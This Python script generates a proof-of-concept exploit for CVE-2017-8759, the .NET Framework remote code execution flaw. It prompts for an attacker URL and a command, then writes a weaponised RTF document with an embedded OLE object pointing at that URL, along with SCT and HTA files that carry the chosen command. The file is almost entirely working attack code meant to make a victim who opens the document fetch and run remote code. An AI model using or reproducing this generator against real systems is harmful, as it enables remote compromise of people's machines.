import sys, os
from urllib.parse import urlparse

class cve_2017_8759(object):
	def __init__(self):

		self.r = '\033[31m'
		self.g = '\033[32m'
		self.y = '\033[33m'
		self.b = '\033[34m'
		self.m = '\033[35m'
		self.c = '\033[36m'
		self.w = '\033[37m'

		print(self.r + '\t[' + self.y + 'PoC for CVE-2017-8759 (Microsoft .NET Framework RCE)' + self.r + '](https://github.com/bhdresh/CVE-2017-8759) ')

		try:
			self.url = raw_input(self.r + '\t[+]' + self.c + 'Enter URL (http://attackerip.com/exploit.txt) will be included in malicious file and will be requested once victim will open malicious RTF file: ' + self.y)
			self.command = raw_input(self.r + '\t[+]' + self.c + 'Enter Command to execute: ' + self.y)
			self.output = raw_input(self.r + '\t[+]' + self.c + 'Enter Output exploit rtf: ' + self.y)
			self.template = raw_input(self.r + '\t[+]' + self.c + 'Enter RTF Template (Not Require): ' + self.y)
		except:
			self.url = input(self.r + '\t[+]' + self.c + 'Enter URL (http://attackerip.com/exploit.txt) will be included in malicious file and will be requested once victim will open malicious RTF file: ' + self.y)
			self.command = input(self.r + '\t[+]' + self.c + 'Enter Command to execute: ' + self.y)
			self.output = input(self.r + '\t[+]' + self.c + 'Enter Output exploit rtf: ' + self.y)
			self.template = input(self.r + '\t[+]' + self.c + 'Enter RTF Template (Not Require): ' + self.y);

		payload = self.generate_exploit_rtf()

		self.domain = urlparse(self.url).netloc
		self.dirOut = os.path.dirname(self.output)
		if self.dirOut != "":
			self.outSCT= self.dirOut + self.url.split(self.domain)[1]
			self.outHTA = self.dirOut + "/cmd.hta"
		else:
			self.outSCT = self.url.split(self.domain)[1].replace("/", "");
			self.outHTA = "cmd.hta"

		self.generate_sct_file()
		self.generate_hta_file()

		f = open(self.output, 'w')
		f.write(payload)
		f.close()

		print(self.r + '\t[*]' + self.y + ' Done ! output file' + self.r + ' --> ' + self.c + self.output + self.w)

	def generate_exploit_rtf(self):
		# Preparing malicious RTF
		s = self.url
		docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
		docuri_pad_len = 714 - len(docuri_hex)
		docuri_pad = "0"*docuri_pad_len
		payload = "{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0\n"
		payload += "{\\info\n"
		payload += "{\\author }\n"
		payload += "{\\operator }\n"
		payload += "}\n"
		payload += "{\\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}\n"
		payload += "{\n"
		payload += "{\\object\\objautlink\\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101\n"
		payload += "{\\*\\objclass Word.Document.8}\n"
		payload += "{\\*\\objdata 010500000200000008000000e2bae4e53e2231000000000000000000000a0000d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff010000000003000000000000c000000000000046000000000000000000000000f02c1951c8e5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000d8010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000020000000300000004000000050000000600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0100000209000000010000000000000000000000000000008c010000c7b0abec197fd211978e0000f8757e2a00000000700100007700730064006c003d00"+docuri_hex+docuri_pad+"00ffffffff0000000000000000000000000000000000000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000}\n"
		payload += "{\\result {\\rtlch\\fcs1 \\af31507 \\ltrch\\fcs0 \\insrsid1979324 }}}}\n"
		payload += "{\\*\\datastore }\n"
		payload += "}\n"

		if self.template != "":
			payload = self.create_payload_with_template(payload)
		
		return payload

	def create_payload_with_template(self, payload):
		
		f = open(self.template, "r")
		content = f.read()
		f.close()

		return content.split("{\\*\\datastore")[0] + payload.split("wordml}}")[1]

	def generate_sct_file(self):
		path = "./CVE_RCE/package/875x_exploit.sct"
		
		f = open(path, "r")
		content = f.read()
		f.close()
		
		content = content.replace("<domain>", self.domain)
		
		fo = open(self.outSCT, "w")
		fo.write(content)
		fo.close()

		print(self.r + '\t[*]' + self.y + ' Done ! Output SCT File ' + self.r + ' --> ' + self.c + self.outSCT + self.w)

	def generate_hta_file(self):
		path = "./CVE_RCE/package/875x_cmd.hta"

		f = open(path, "r")
		content = f.read()
		f.close()

		content = content.replace("<command>", self.command);

		fo = open(self.outHTA, "w")
		fo.write(content)
		fo.close()

		print(self.r + '\t[*]' + self.y + ' Done ! Output HTA File ' + self.r + ' --> ' + self.c + self.outHTA + self.w)
	